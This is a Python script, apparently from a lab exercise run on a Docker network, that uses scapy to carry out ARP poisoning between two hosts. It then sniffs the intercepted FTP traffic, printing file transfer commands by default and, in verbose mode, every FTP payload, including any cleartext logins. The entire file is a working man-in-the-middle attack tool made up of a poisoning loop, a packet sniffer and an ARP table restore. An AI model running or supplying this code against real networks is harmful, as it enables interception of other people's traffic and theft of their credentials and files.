import argparse
import json
import re
import signal
import subprocess
import threading
import time
from scapy.all import ARP, Ether, send, sniff
import netifaces

running = True
src_ip = None
src_mac = None
target_ip = None
target_mac = None
verbose = False

## UTILS FUNCTIONS

def signal_handler(signal, frame):
    """
    Handle signals, specifically the CTRL+C interruption.
    Args: signal (int): The signal number.
          frame: The current stack frame.
    """
    global running
    print("CTRL+C detected. Exiting gracefully...")
    running = False

signal.signal(signal.SIGINT, signal_handler)

def validate_ip(ip):
    """
    Validate an IP address.
    Args: ip (str): The IP address to validate.
    Returns: str: The validated IP address.
    Raises: argparse.ArgumentTypeError: If the IP is not valid.
    """
    pattern = re.compile(r"^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$")
    if not pattern.match(ip):
        raise argparse.ArgumentTypeError(f"{ip} n'est pas une adresse IP valide.")
    return ip

def validate_mac(mac):
    """
    Validate a MAC address.
    Args: mac (str): The MAC address to validate.
    Returns: str: The validated MAC address.
    Raises: argparse.ArgumentTypeError: If the MAC is not valid.
    """
    pattern = re.compile(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$")
    if not pattern.match(mac):
        raise argparse.ArgumentTypeError(f"{mac} n'est pas une adresse MAC valide.")
    return mac

def parse_arguments():
    """
    Parse and validate command line arguments.
    Returns: tuple: A tuple containing source IP, source MAC, target IP, target MAC, and verbosity status.
    """
    parser = argparse.ArgumentParser(description="ARP poisoning and FTP packet eavesdropping.")

    parser.add_argument("src_ip", help="IP source address", type=validate_ip)
    parser.add_argument("src_mac", help="MAC source address", type=validate_mac)
    parser.add_argument("target_ip", help="IP target adress", type=validate_ip)
    parser.add_argument("target_mac", help="MAC target adress", type=validate_mac)
    parser.add_argument("-v", "--verbose", action="store_true", help="Display all FTP traffic.")

    args = parser.parse_args()

    print("Arguments parsed successfully")
    return args.src_ip, args.src_mac, args.target_ip, args.target_mac, args.verbose

## MAIN FUNCTIONS

def restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac):
    """
    Restore the ARP table entries for a given victim and gateway.
    Args: victim_ip (str): The IP address of the victim.
          victim_mac (str): The MAC address of the victim.
          gateway_ip (str): The IP address of the gateway.
          gateway_mac (str): The MAC address of the gateway.
    """
    print(f"Restoring ARP tables for {victim_ip} ({victim_mac}) and {gateway_ip} ({gateway_mac})")
    arp_victim = ARP(op="is-at", psrc=gateway_ip, pdst=victim_ip, hwsrc=gateway_mac, hwdst=victim_mac)
    arp_gateway = ARP(op="is-at", psrc=victim_ip, pdst=gateway_ip, hwsrc=victim_mac, hwdst=gateway_mac)
    send(arp_victim, verbose=0)
    send(arp_gateway, verbose=0)

def arp_poison(src_ip, src_mac, target_ip, target_mac):
    """
    Send ARP poisoning packets to a target and source.
    Args: src_ip (str): Source IP address.
          src_mac (str): Source MAC address.
          target_ip (str): Target IP address.
          target_mac (str): Target MAC address.
    """
    arp_response_target = ARP(pdst=target_ip, hwdst=target_mac, psrc=src_ip, op='is-at')
    arp_response_gateway = ARP(pdst=src_ip, hwdst=src_mac, psrc=target_ip, op='is-at')
    send(arp_response_target, verbose=0)
    send(arp_response_gateway, verbose=0)

def sniff_ftp_packets():
    """
    Listen and process FTP packets on the Docker bridge interface.
    """
    global running
    interface_name = "eth0"

    print("Listening for FTP packets...")
    while running:
        if interface_name:
            sniff(prn=parse_packet, timeout=2, store=0, iface=interface_name)
        else:
            print("Unable to determine bridge interface name.")
            break

def parse_packet(packet):
    """
    Parse and process an intercepted packet.
    Args: packet: The intercepted packet.
    """
    global src_ip, src_mac, target_ip, target_mac, verbose
    if packet.haslayer("TCP") and packet["TCP"].payload:
            raw_data = packet["TCP"].payload.load.decode(errors='replace')
            if verbose:
                print(f"FTP Traffic from {src_ip} to {target_ip}: {raw_data.strip()}")
            else:
                if 'STOR' in raw_data or 'RETR' in raw_data:
                    filename = raw_data.split(maxsplit=2)[1]
                    print(f"From {src_ip} to {target_ip}: {raw_data.strip()}")

def arp_poison_loop():
    """
    Continuously send ARP poisoning packets while the application is running.
    """
    global src_ip, src_mac, target_ip, target_mac, running
    while running:
        try:
            arp_poison(src_ip, src_mac, target_ip, target_mac)
            time.sleep(2)
        except Exception as e:
            print(f"Error in ARP poison thread: {e}")

def main():
    """
    The main function that sets up ARP poisoning and listens for FTP packets.
    """
    global src_ip, src_mac, target_ip, target_mac, verbose
    src_ip, src_mac, target_ip, target_mac, verbose = parse_arguments()

    poison_thread = threading.Thread(target=arp_poison_loop)
    poison_thread.start()

    try:
        sniff_ftp_packets()
    except KeyboardInterrupt:
        print("\nCTRL+C detected. Restoring ARP tables...")

    restore_arp(src_ip, src_mac, target_ip, target_mac)
    running = False  # Stops the poisoning thread
    poison_thread.join()

if __name__ == "__main__":
    main()
